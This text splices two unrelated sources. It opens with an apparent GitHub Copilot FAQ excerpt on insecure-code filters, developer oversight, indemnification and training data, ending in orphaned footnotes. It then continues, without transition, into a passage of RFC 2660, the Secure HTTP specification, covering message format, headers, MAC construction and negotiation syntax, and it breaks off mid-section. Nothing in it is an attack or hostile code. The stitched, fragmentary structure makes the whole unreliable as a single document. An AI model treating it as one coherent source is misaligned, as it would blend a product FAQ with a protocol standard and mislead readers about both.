Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.

Abstract

   This memo describes a syntax for securing messages sent using the
   Hypertext Transfer Protocol (HTTP), which forms the basis for the
   World Wide Web. Secure HTTP (S-HTTP) provides independently
   applicable security services for transaction confidentiality,
   authenticity/integrity and non-repudiability of origin.

   The protocol emphasizes maximum flexibility in choice of key
   management mechanisms, security policies and cryptographic algorithms
   by supporting option negotiation between parties for each
   transaction.

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

[1](#section-1).  Introduction

   The World Wide Web (WWW) is a distributed hypermedia system which has
   gained widespread acceptance among Internet users.  Although WWW
   browsers support other, preexisting Internet application protocols,
   the native and primary protocol used between WWW clients and servers
   is the HyperText Transfer Protocol (HTTP) [[RFC-2616](./rfc2616 "\"Hypertext Transfer Protocol -- HTTP/1.1\"")].  The ease of
   use of the Web has prompted its widespread employment as a
   client/server architecture for many applications.  Many such
   applications require the client and server to be able to authenticate
   each other and exchange sensitive information confidentially. The
   original HTTP specification had only modest support for the
   cryptographic mechanisms appropriate for such transactions.

   Secure HTTP (S-HTTP) provides secure communication mechanisms between
   an HTTP client-server pair in order to enable spontaneous commercial
   transactions for a wide range of applications.  Our design intent is
   to provide a flexible protocol that supports multiple orthogonal
   operation modes, key management mechanisms, trust models,
   cryptographic algorithms and encapsulation formats through option
   negotiation between parties for each transaction.

[1.1](#section-1.1).  Summary of Features

   Secure HTTP is a secure message-oriented communications protocol
   designed for use in conjunction with HTTP. It is designed to coexist
   with HTTP's messaging model and to be easily integrated with HTTP
   applications.

   Secure HTTP provides a variety of security mechanisms to HTTP clients
   and servers, providing the security service options appropriate to
   the wide range of potential end uses possible for the World-Wide Web.
   The protocol provides symmetric capabilities to both client and
   server (in that equal treatment is given to both requests and
   replies, as well as for the preferences of both parties) while
   preserving the transaction model and implementation characteristics
   of HTTP.

   Several cryptographic message format standards may be incorporated
   into S-HTTP clients and servers, particularly, but in principle not
   limited to, [[CMS](#ref-CMS "\"Cryptographic Message Syntax\"")] and [MOSS]. S-HTTP supports interoperation among a
   variety of implementations, and is compatible with HTTP.  S-HTTP
   aware clients can communicate with S-HTTP oblivious servers and
   vice-versa, although such transactions obviously would not use S-HTTP
   security features.

   S-HTTP does not require client-side public key certificates (or
   public keys), as it supports symmetric key-only operation modes.

Rescorla & Schiffman          Experimental                      [Page 3]

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   This is significant because it means that spontaneous private
   transactions can occur without requiring individual users to have
   an established public key.  While S-HTTP is able to take advantage
   of ubiquitous certification infrastructures, its deployment does
   not require it.

   S-HTTP supports end-to-end secure transactions, in contrast with the
   original HTTP authorization mechanisms which require the client to
   attempt access and be denied before the security mechanism is
   employed.  Clients may be "primed" to initiate a secure transaction
   (typically using information supplied in message headers); this may
   be used to support encryption of fill-out forms, for example. With
   S-HTTP, no sensitive data need ever be sent over the network in the
   clear.

   S-HTTP provides full flexibility of cryptographic algorithms, modes
   and parameters. Option negotiation is used to allow clients and
   servers to agree on transaction modes (e.g., should the request be
   signed or encrypted or both -- similarly for the reply?);
   cryptographic algorithms (RSA vs. DSA for signing, DES vs.
   RC2 for encrypting, etc.); and certificate selection
   (please sign with your "Block-buster Video certificate").

   S-HTTP attempts to avoid presuming a particular trust model, although
   its designers admit to a conscious effort to facilitate
   multiply-rooted hierarchical trust, and anticipate that principals may
   have many public key certificates.

   S-HTTP differs from Digest-Authentication, described in [[RFC-2617](./rfc2617 "\"HTTP Authentication: Basic and Digest Access Authentication\"")] in
   that it provides support for public key cryptography and consequently
   digital signature capability, as well as providing confidentiality.

[1.2](#section-1.2).  Changes

   This document describes S-HTTP/1.4. It differs from the previous
   memo in that it differs from the previous memo in its support of
   the Cryptographic Message Syntax (CMS) [[CMS](#ref-CMS "\"Cryptographic Message Syntax\"")], a successor to PKCS-7;
   and hence now supports the Diffie-Hellman and the (NIST) Digital
   Signature Standard cryptosystems. CMS used in RSA mode is bits on the
   wire compatible with PKCS-7.

[1.3](#section-1.3).  Processing Model

[1.3.1](#section-1.3.1).  Message Preparation

   The creation of an S-HTTP message can be thought of as a a function
   with three inputs:

      1. The cleartext message. This is either an HTTP message
      or some other data object. Note that since the cleartext message
      is carried transparently, headers and all, any version of HTTP
      can be carried within an S-HTTP wrapper.
      2. The receiver's cryptographic preferences and keying material.
      This is either explicitly specified by the receiver or subject
      to some default set of preferences.
      3. The sender's cryptographic preferences and keying material.
      This input to the function can be thought of as implicit
      since it exists only in the memory of the sender.

   In order to create an S-HTTP message, then, the sender integrates the
   sender's preferences with the receiver's preferences. The result of
   this is a list of cryptographic enhancements to be applied and keying
   material to be used to apply them. This may require some user
   intervention. For instance, there might be multiple keys available to
   sign the message. (See [Section 3.2.4.9.3](#section-3.2.4.9.3) for more on this topic.)
   Using this data, the sender applies the enhancements to the message
   clear-text to create the S-HTTP message.

   The processing steps required to transform the cleartext message into
   the S-HTTP message are described in Sections [2](#section-2) and [3](#section-3). The processing
   steps required to merge the sender's and receiver's preferences are
   described in Sections [3.2](#section-3.2).

[1.3.2](#section-1.3.2).  Message Recovery

   The recovery of an S-HTTP message can be thought of as a function of
   four distinct inputs:

      1. The S-HTTP message.
      2. The receiver's stated cryptographic preferences and keying
      material. The receiver has the opportunity to remember what
      cryptographic preferences it provided in order for this
      document to be dereferenced.
      3. The receiver's current cryptographic preferences and
      keying material.
      4. The sender's previously stated cryptographic options.
      The sender may have stated that he would perform certain
      cryptographic operations in this message. (Again, see
      sections [4](#section-4) and [5](#section-5) for details on how to do this.)

Rescorla & Schiffman          Experimental                      [Page 5]
```

---

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   In order to recover an S-HTTP message, the receiver needs to read the
   headers to discover which cryptographic transformations were
   performed on the message, then remove the transformations using some
   combination of the sender's and receiver's keying material, while
   taking note of which enhancements were applied.

   The receiver may also choose to verify that the applied enhancements
   match both the enhancements that the sender said he would apply
   (input 4 above) and that the receiver requested (input 2 above) as
   well as the current preferences to see if the S-HTTP message was
   appropriately transformed. This process may require interaction with
   the user to verify that the enhancements are acceptable to the user.
   (See [Section 6.4](#section-6.4) for more on this topic.)

[1.4](#section-1.4).  Modes of Operation

   Message protection may be provided on three orthogonal axes:
   signature, authentication, and encryption. Any message may be signed,
   authenticated, encrypted, or any combination of these (including no
   protection).

   Multiple key management mechanisms are supported, including
   password-style manually shared secrets and public-key key exchange.
   In particular, provision has been made for prearranged (in an earlier
   transaction or out of band) symmetric session keys in order to send
   confidential messages to those who have no public key pair.

   Additionally, a challenge-response ("nonce") mechanism is provided to
   allow parties to assure themselves of transaction freshness.

[1.4.1](#section-1.4.1).  Signature

   If the digital signature enhancement is applied, an appropriate
   certificate may either be attached to the message (possibly along
   with a certificate chain) or the sender may expect the recipient to
   obtain the required certificate (chain) independently.

[1.4.2](#section-1.4.2).  Key Exchange and Encryption

   In support of bulk encryption, S-HTTP defines two key transfer
   mechanisms, one using public-key enveloped key exchange and another
   with externally arranged keys.

   In the former case, the symmetric-key cryptosystem parameter is
   passed encrypted under the receiver's public key.

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   In the latter mode, we encrypt the content using a prearranged
   session key, with key identification information specified on one of
   the header lines.

[1.4.3](#section-1.4.3).  Message Integrity and Sender Authentication

   Secure HTTP provides a means to verify message integrity and sender
   authenticity for a message via the computation of a Message
   Authentication Code (MAC), computed as a keyed hash over the document
   using a shared secret -- which could potentially have been arranged
   in a number of ways, e.g.: manual arrangement or 'inband' key
   management.  This technique requires neither the use of public key
   cryptography nor encryption.

   This mechanism is also useful for cases where it is appropriate to
   allow parties to identify each other reliably in a transaction
   without providing (third-party) non-repudiability for the
   transactions themselves. The provision of this mechanism is motivated
   by our bias that the action of "signing" a transaction should be
   explicit and conscious for the user, whereas many authentication
   needs (i.e., access control) can be met with a lighter-weight
   mechanism that retains the scalability advantages of public-key
   cryptography for key exchange.

[1.4.4](#section-1.4.4).  Freshness

   The protocol provides a simple challenge-response mechanism, allowing
   both parties to insure the freshness of transmissions. Additionally,
   the integrity protection provided to HTTP headers permits
   implementations to consider the Date: header allowable in HTTP
   messages as a freshness indicator, where appropriate (although this
   requires implementations to make allowances for maximum clock skew
   between parties, which we choose not to specify).

[1.5](#section-1.5).  Implementation Options

   In order to encourage widespread adoption of secure documents for the
   World-Wide Web in the face of the broad scope of application
   requirements, variability of user sophistication, and disparate
   implementation constraints, Secure HTTP deliberately caters to a
   variety of implementation options.  See [Section 8](#section-8) for implementation
   recommendations and requirements.

[2](#section-2).  Message Format

   Syntactically, Secure HTTP messages are the same as HTTP, consisting
   of a request or status line followed by headers and a body. However,
   the range of headers is different and the bodies are typically

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   cryptographically enhanced.

[2.1](#section-2.1).  Notational Conventions

   This document uses the augmented BNF from HTTP [[RFC-2616](./rfc2616 "\"Hypertext Transfer Protocol -- HTTP/1.1\"")]. You should
   refer to that document for a description of the syntax.

[2.2](#section-2.2).  Request Line

   In order to differentiate S-HTTP messages from HTTP messages and
   allow for special processing, the request line should use the special
   Secure" method and use the protocol designator "Secure-HTTP/1.4".
   Consequently, Secure-HTTP and HTTP processing can be intermixed on
   the same TCP port, e.g. port 80.  In order to prevent leakage of
   potentially sensitive information Request-URI should be "*". For
   example:

           Secure * Secure-HTTP/1.4

   When communicating via a proxy, the Request-URI should be consist of
   the AbsoluteURI. Typically, the rel path section should be replaced
   by "*" to minimize the information passed to in the clear.  (e.g.
   <http://www.terisa>.com/*); proxies should remove the appropriate
   amount of this information to minimize the threat of traffic
   analysis.  See [Section 7.2.2.1](#section-7.2.2.1) for a situation where providing more
   information is appropriate.

[2.3](#section-2.3).  The Status Line

   S-HTTP responses should use the protocol designator "Secure-
   HTTP/1.4".  For example:

           Secure-HTTP/1.4 200 OK

   Note that the status in the Secure HTTP response line does not
   indicate anything about the success or failure of the unwrapped HTTP
   request. Servers should always use 200 OK provided that the Secure
   HTTP processing is successful. This prevents analysis of success or
   failure for any request, which the correct recipient can determine
   from the encapsulated data. All case variations should be accepted.

[2.4](#section-2.4).  Secure HTTP Header Lines

   The header lines described in this section go in the header of a
   Secure HTTP message. All except 'Content-Type' and 'Content-Privacy-
   Domain' are optional. The message body shall be separated from the
   header block by two successive CRLFs.

Rescorla & Schiffman          Experimental                      [Page 8]
```

---

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   All data and fields in header lines should be treated as case
   insensitive unless otherwise specified. Linear whitespace [[RFC-822](./rfc822 "\"Standard For The Format Of ARPA Internet Text Messages\"")]
   should be used only as a token separator unless otherwise quoted.
   Long header lines may be line folded in the style of [[RFC-822](./rfc822 "\"Standard For The Format Of ARPA Internet Text Messages\"")].

   This document refers to the header block following the S-HTTP
   request/response line and preceding the successive CRLFs collectively
   as "S-HTTP headers".

[2.4.1](#section-2.4.1).  Content-Privacy-Domain

   The two values defined by this document are 'MOSS' and 'CMS'.  CMS
   refers to the privacy enhancement specified in [section 2.6.1](#section-2.6.1). MOSS
   refers to the format defined in [[RFC-1847](./rfc1847 "\"Security Muliparts for MIME: Multipart/Signed and Multipart/Encrypted\"")] and [[RFC-1848](./rfc1848 "\"MIME Object Security Services\"")].

[2.4.2](#section-2.4.2).  Content-Type for CMS

   Under normal conditions, the terminal encapsulated content (after all
   privacy enhancements have been removed) would be an HTTP message. In
   this case, there shall be a Content-Type line reading:

           Content-Type: message/http

   The message/http content type is defined in [RFC-2616](./rfc2616).

   If the inner message is an S-HTTP message, then the content type
   shall be 'application/s-http'. (See Appendix for the definition of
   this.)

   It is intended that these types be registered with IANA as MIME
   content types.

   The terminal content may be of some other type provided that the type
   is properly indicated by the use of an appropriate Content-Type
   header line. In this case, the header fields for the encapsulation of
   the terminal content apply to the terminal content (the 'final
   headers'). But in any case, final headers should themselves always be
   S-HTTP encapsulated, so that the applicable S-HTTP/HTTP headers are
   never passed unenhanced.

   S-HTTP encapsulation of non-HTTP data is a useful mechanism for
   passing pre-enhanced data (especially presigned data) without
   requiring that the HTTP headers themselves be pre-enhanced.

[2.4.3](#section-2.4.3).  Content-Type for MOSS

   The Content-Type for MOSS shall be an acceptable MIME content type
   describing the cryptographic processing applied. (e.g.
   multipart/signed). The content type of the inner content is described
   in the content type line corresponding to that inner content, and for
   HTTP messages shall be 'message/http'.

[2.4.4](#section-2.4.4).  Prearranged-Key-Info

   This header line is intended to convey information about a key which
   has been arranged outside of the internal cryptographic format. One
   use of this is to permit in-band communication of session keys for
   return encryption in the case where one of the parties does not have
   a key pair. However, this should also be useful in the event that the
   parties choose to use some other mechanism, for instance, a one-time
   key list.

   This specification defines two methods for exchanging named keys,
   Inband, Outband. Inband indicates that the session key was exchanged
   previously, using a Key-Assign header of the corresponding method.
   Outband arrangements imply that agents have external access to key
   materials corresponding to a given name, presumably via database
   access or perhaps supplied immediately by a user from keyboard input.
   The syntax for the header line is:

     Prearranged-Key-Info =
      "Prearranged-Key-Info" ":" Hdr-Cipher "," CoveredDEK "," CoverKey-ID
     CoverKey-ID = method ":" key-name
     CoveredDEK = *HEX
     method = "inband" |  "outband"

   While chaining ciphers require an Initialization Vector (IV) [FIPS-
   81] to start off the chaining, that information is not carried by
   this field. Rather, it should be passed internal to the cryptographic
   format being used. Likewise, the bulk cipher used is specified in
   this fashion.

   <Hdr-Cipher> should be the name of the block cipher used to encrypt
   the session key (see [section 3.2.4.7](#section-3.2.4.7))

   <CoveredDEK> is the protected Data Encryption Key (a.k.a. transaction
   key) under which the encapsulated message was encrypted. It should be
   appropriately (randomly) generated by the sending agent, then
   encrypted under the cover of the negotiated key (a.k.a. session key)
   using the indicated header cipher, and then converted into hex.

```

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   In order to avoid name collisions, cover key namespaces must be
   maintained separately by host and port.

   Note that some Content-Privacy-Domains, notably likely future
   revisions of MOSS and CMS may have support for symmetric key
   management.

   The Prearranged-Key-Info field need not be used in such
   circumstances.  Rather, the native syntax is preferred. Keys
   exchanged with Key-Assign, however, may be used in this situation.

[2.4.5](#section-2.4.5).  MAC-Info

   This header is used to supply a Message Authenticity Check, providing
   both message authentication and integrity, computed from the message
   text, the time (optional -- to prevent replay attack), and a shared
   secret between client and server. The MAC should be computed over the
   encapsulated content of the S-HTTP message.  S-HTTP/1.1 defined that
   MACs should be computed using the following algorithm ('||' means
   concatenation):

        MAC = hex(H(Message||[<time>]||<shared key>))

   The time should be represented as an unsigned 32 bit quantity
   representing seconds since 00:00:00 GMT January 1, 1970 (the UNIX
   epoch), in network byte order. The shared key format is a local
   matter.

   Recent research [[VANO95](#ref-VANO95 "\"On the security of two MAC algorithms\"")] has demonstrated some weaknesses in this
   approach, and this memo introduces a new construction, derived from
   [[RFC-2104](./rfc2104 "\"HMAC: Keyed- Hashing for Message Authentication\"")]. In the name of backwards compatibility, we retain the
   previous constructions with the same names as before. However, we
   also introduce a new series of names (See [Section 3.2.4.8](#section-3.2.4.8) for the
   names) that obey a different (hopefully stronger) construction. (^
   means bitwise XOR)

   HMAC = hex(H(K' ^ pad2 || H(K' ^ pad1 ||[<time>]|| Message)))
   pad1 = the byte 0x36 repeated enough times to fill out a
                hash input block. (I.e. 64 times for both MD5 and SHA-1)
   pad2 = the byte 0x5c repeated enough times to fill out a
                hash input block.
   K' = H(<shared key>)

   The original HMAC construction is for the use of a key with length
   equal to the length of the hash output. Although it is considered
   safe to use a key of a different length (Note that strength cannot be
   increased past the length of the hash function itself, but can be
   reduced by using a shorter key.) [[KRAW96b](#ref-KRAW96b)] we hash the original key

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   to permit the use of shared keys (e.g. passphrases) longer than the
   length of the hash. It is noteworthy (though obvious) that this
   technique does not increase the strength of short keys.

   The format of the MAC-Info line is:

   MAC-Info =
   "MAC-Info" ":"  [hex-time],
   hash-alg, hex-hash-data, key-spec
   hex-time = <unsigned seconds since Unix epoch represented as HEX>
   hash-alg = <hash algorithms from [section 3.2.4.8](#section-3.2.4.8)>
   hex-hash-data = <computation as described above represented as HEX>
   Key-Spec = "null" | "dek" | Key-ID

   Key-Ids can refer either to keys bound using the Key-Assign header
   line or those bound in the same fashion as the Outband method
   described later. The use of a 'Null' key-spec implies that a zero
   length key was used, and therefore that the MAC merely represents a
   hash of the message text and (optionally) the time.  The special
   key-spec 'DEK' refers to the Data Exchange Key used to encrypt the
   following message body (it is an error to use the DEK key-spec in
   situations where the following message body is unencrypted).

   If the time is omitted from the MAC-Info line, it should simply not
   be included in the hash.

   Note that this header line can be used to provide a more advanced
   equivalent of the original HTTP Basic authentication mode in that the
   user can be asked to provide a username and password. However, the
   password remains private and message integrity can be assured.
   Moreover, this can be accomplished without encryption of any kind.

   In addition, MAC-Info permits fast message integrity verification (at
   the loss of non-repudiability) for messages, provided that the
   participants share a key (possibly passed using Key-Assign in a
   previous message).

   Note that some Content-Privacy-Domains, notably likely future
   revisions of MOSS and CMS may have support for symmetric integrity
   protection The MAC-Info field need not be used in such circumstances.
   Rather, the native syntax is preferred. Keys exchanged with Key-
   Assign, however, may be used in this situation.

[2.5](#section-2.5).  Content

   The content of the message is largely dependent upon the values of
   the Content-Privacy-Domain and Content-Transfer-Encoding fields.

Rescorla & Schiffman          Experimental                     [Page 12]
```

---

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   For a CMS message, with '8BIT' Content-Transfer-Encoding, the content
   should simply be the CMS message itself.

   If the Content-Privacy-Domain is MOSS, the content should consist of
   a MOSS Security Multipart as described in [RFC1847](./rfc1847).

   It is expected that once the privacy enhancements have been removed,
   the resulting (possibly protected) contents will be a normal HTTP
   request. Alternately, the content may be another Secure-HTTP message,
   in which case privacy enhancements should be unwrapped until clear
   content is obtained or privacy enhancements can no longer be removed.
   (This permits embedding of enhancements, such as sequential Signed
   and Enveloped enhancements.) Provided that all enhancements can be
   removed, the final de-enhanced content should be a valid HTTP request
   (or response) unless otherwise specified by the Content-Type line.

   Note that this recursive encapsulation of messages potentially
   permits security enhancements to be applied (or removed) for the
   benefit of intermediaries who may be a party to the transaction
   between a client and server (e.g., a proxy requiring client
   authentication).  How such intermediaries should indicate such
   processing is described in [Section 7.2.1](#section-7.2.1).

[2.6](#section-2.6).  Encapsulation Format Options

[2.6.1](#section-2.6.1).  Content-Privacy-Domain: CMS

   Content-Privacy-Domain 'CMS' follows the form of the CMS standard
   (see Appendix).

   Message protection may proceed on two orthogonal axes: signature and
   encryption. Any message may be either signed, encrypted, both, or
   neither. Note that the 'auth' protection mode of S-HTTP is provided
   independently of CMS coding via the MAC-Info header of [section 2.3.6](#section-2.3.6)
   since CMS does not support a 'KeyDigestedData' type, although it does
   support a 'DigestedData' type.

[2.6.1.1](#section-2.6.1.1).  Signature

   This enhancement uses the 'SignedData' type of CMS.  When digital
   signatures are used, an appropriate certificate may either be
   attached to the message (possibly along with a certificate chain) as
   specified in CMS or the sender may expect the recipient to obtain its
   certificate (and/or chain) independently.  Note that an explicitly
   allowed instance of this is a certificate signed with the private
   component corresponding to the public component being attested to.
   This shall be referred to as a self-signed certificate. What, if any,
   weight to give to such a certificate is a purely local matter.  In

Rescorla & Schiffman          Experimental                     [Page 13]
```

---

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   either case, a purely signed message is precisely CMS compliant.

[2.6.1.2](#section-2.6.1.2).  Encryption

[2.6.1.2.1](#section-2.6.1.2.1).  Encryption -- normal, public key

   This enhancement is performed precisely as enveloping (using either '
   EnvelopedData' types) under CMS. A message encrypted in this fashion,
   signed or otherwise, is CMS compliant. To have a message which is
   both signed and encrypted, one simply creates the CMS SignedData
   production and encapsulates it in EnvelopedData as described in CMS.

[2.6.1.2.2](#section-2.6.1.2.2).  Encryption -- prearranged key

   This uses the 'EncryptedData' type of CMS. In this mode, we encrypt
   the content using a DEK encrypted under cover of a prearranged
   session key (how this key may be exchanged is discussed later), with
   key identification information specified on one of the header lines.
   The IV is in the EncryptedContentInfo type of the EncryptedData
   element.  To have a message which is both signed and encrypted, one
   simply creates the CMS SignedData production and encapsulates it in
   EncryptedData as described in CMS.

[2.6.2](#section-2.6.2).  Content-Privacy-Domain: MOSS

   The body of the message should be a MIME compliant message with
   content type that matches the Content-Type line in the S-HTTP
   headers.  Encrypted messages should use multipart/encrypted. Signed
   messages should use multipart/signed. However, since multipart/signed
   does not convey keying material, is is acceptable to use
   multipart/mixed where the first part is application/mosskey-data and
   the second part is multipart/mixed in order to convey certificates
   for use in verifying the signature.

   Implementation Note: When both encryption and signature are applied
   by the same agent, signature should in general be applied before
   encryption.

[2.6.3](#section-2.6.3).  Permitted HTTP headers

[2.6.3.1](#section-2.6.3.1).  Overview

   In general, HTTP [[RFC-2616](./rfc2616 "\"Hypertext Transfer Protocol -- HTTP/1.1\"")] headers should appear in the inner
   content (i.e. the message/http) of an S-HTTP message but should not
   appear in the S-HTTP message wrapper for security reasons. However,
   certain headers need to be visible to agents which do not have access
   to the encapsulated data. These headers may appear in the S-HTTP
   headers as well.

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   Please note that although brief descriptions of the general purposes
   of these headers are provided for clarity, the definitive reference
   is [[RFC-2616](./rfc2616 "\"Hypertext Transfer Protocol -- HTTP/1.1\"")].

[2.6.3.2](#section-2.6.3.2).  Host

   The host header specificies the internet host and port number of the
   resource being requested. This header should be used to disambiguate
   among multiple potential security contexts within which this message
   could be interpreted. Note that the unwrapped HTTP message will have
   it's own Host field (assuming it's an HTTP/1.1 message). If these
   fields do not match, the server should respond with a 400 status
   code.

[2.6.3.3](#section-2.6.3.3).  Connection

   The Connection field has precisely the same semantics in S-HTTP
   headers as it does in HTTP headers. This permits persistent
   connections to be used with S-HTTP.

[3](#section-3).  Cryptographic Parameters

[3.1](#section-3.1).  Options Headers

   As described in [Section 1.3.2](#section-1.3.2), every S-HTTP request is (at least
   conceptually) preconditioned by the negotiation options provided by
   the potential receiver. The two primary locations for these options
   are

           1. In the headers of an HTTP Request/Response.
           2. In the HTML which contains the anchor being dereferenced.

   There are two kinds of cryptographic options which may be provided:
   Negotiation options, as discussed in [Section 3.2](#section-3.2) convey a potential
   message recipient's cryptographic preferences. Keying options, as
   discussed in [Section 3.3](#section-3.3) provide keying material (or pointers to
   keying material) which may be of use to the sender when enhancing a
   message.

   Binding cryptographic options to anchors using HTML extensions is the
   topic of the companion document [[SHTML](#ref-SHTML "\"Security Extensions For HTML\"")] and will not be treated here.

[3.2](#section-3.2).  Negotiation Options

[3.2.1](#section-3.2.1).  Negotiation Overview

   Both parties are able to express their requirements and preferences
   regarding what cryptographic enhancements they will permit/require
   the other party to provide. The appropriate option choices depend on
   implementation capabilities and the requirements of particular
   applications.

   A negotiation header is a sequence of specifications each conforming
   to a four-part schema detailing:

        Property -- the option being negotiated, such as bulk encryption
        algorithm.

        Value -- the value being discussed for the property, such as
        DES-CBC

        Direction -- the direction which is to be affected, namely:
        during reception or origination (from the perspective of the
        originator).

        Strength -- strength of preference, namely: required, optional,
        refused

   As an example, the header line:

           SHTTP-Symmetric-Content-Algorithms: recv-optional=DES-CBC,RC2

   could be thought to say: "You are free to use DES-CBC or RC2 for bulk
   encryption for encrypting messages to me."

   We define new headers (to be used in the encapsulated HTTP header,
   not in the S-HTTP header) to permit negotiation of these matters.

[3.2.2](#section-3.2.2).  Negotiation Option Format

   The general format for negotiation options is:

           Option = Field ":" Key-val ";" *(Key-val)
           Key-val = Key "=" Value *("," Value)
           Key = Mode"-"Action             ; This is represented as one
                                           ; token without whitespace
           Mode = "orig" | "recv"
           Action = "optional" | "required" | "refused"

```

---

```

[RFC 2660](./rfc2660)         The Secure HyperText Transfer Protocol      August 1999

   The <Mode> value indicates whether this <Key-val> refers to what the
   agent's actions are upon sending privacy enhanced messages as opposed
   to upon receiving them. For any given mode-action pair, the
   interpretation to be placed on the enhancements (<Value>s) listed is:

        'recv-optional:' The agent will process the enhancement if the
        other party uses it, but will also gladly process messages
        without the enhancement.

        'recv-required:' The agent will not process messages without
        this enhancement.

        'recv-refused:' The agent will not process messages with this
        enhancement.

        'orig-optional:' When encountering an agent which refuses this
        enhancement, the agent will not provide it, and when
        encountering an agent which requires it, this agent will provide
        it.

        'orig-required:' The agent will always generate the enhancement.

        'orig-refused:' The agent will never generate the enhancement.

   The behavior of agents which discover that they are communicating
   with an incompatible agent is at the discretion of the agents. It is
   inappropriate to blindly persist in a behavior that is known to be
   unacceptable to the other party. Plausible responses include simply
   terminating the connection, or, in the case of a server response,
   returning 'Not implemented 501'.

   Optional values are considered to be listed in decreasing order of
   preference. Agents are free to choose any member of the intersection
   of the optional lists (or none) however.

   If any <Key-Val> is left undefined, it should be assumed to be set to
   the default. Any key which is specified by an agent shall override
   any appearance of that key in any <Key-Val> in the default for that
   field.

[3.2.3](#section-3.2.3).  Parametrization for Variable-length Key Ciphers

   For ciphers with variable key lengths, values may be parametrized
   using the syntax <cipher>'['<length>']'

   For example, 'RSA[1024]' represents a 1024 bit key for RSA. Ranges
   may be represented as

           <cipher>'['<bound1>'-'<bound2>']'

   For purposes of preferences, this notation should be treated as if it
   read (assuming x and y are integers)

           <cipher>[x], <cipher>[x+1],...<cipher>[y] (if x<y)

   and

           <cipher>[x], <cipher>[x-1],...<cipher>[y] (if x>y)

   The special value 'inf' may be used to denote infinite length.

   Using simply <cipher> for such a cipher shall be read as the maximum
   range possible with the given cipher.

[3.2.4](#section-3.2.4).  Negotiation Syntax

[3.2.4.1](#section-3.2.4.1).  SHTTP-Privacy-Domains

   This header refers to the Content-Privacy-Domain type of [section](#section-2.3.1)
   [2.3.1](#section-2.3.1). Acceptable values are as listed there. For instance,

                   SHTTP-Privacy-Domains: orig-required=cms;
                                          recv-optional=cms,MOSS

   would indicate that the agent always generates CMS compliant
   messages, but can read CMS or MOSS (or, unenhanced messages).

[3.2.4.2](#section-3.2.4.2).  SHTTP-Certificate-Types

   This indicates what sort of Public Key certificates the agent will
   accept. Currently defined values are 'X.509' and 'X.509v3'.

[3.2.4.3](#section-3.2.4.3).  SHTTP-Key-Exchange-Algorithms

   This header indicates which algorithms may be used for key exchange.
   Defined values are 'DH', 'RSA', 'Outband' and 'Inband'. DH refers to
   Diffie-Hellman X9.42 style enveloping. [DH] RSA refers to RSA
   enveloping. Outband refers to some sort of external key agreement.

